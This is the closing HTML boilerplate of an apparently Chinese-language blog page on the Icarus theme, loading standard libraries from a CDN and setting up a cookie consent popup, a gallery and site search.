src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>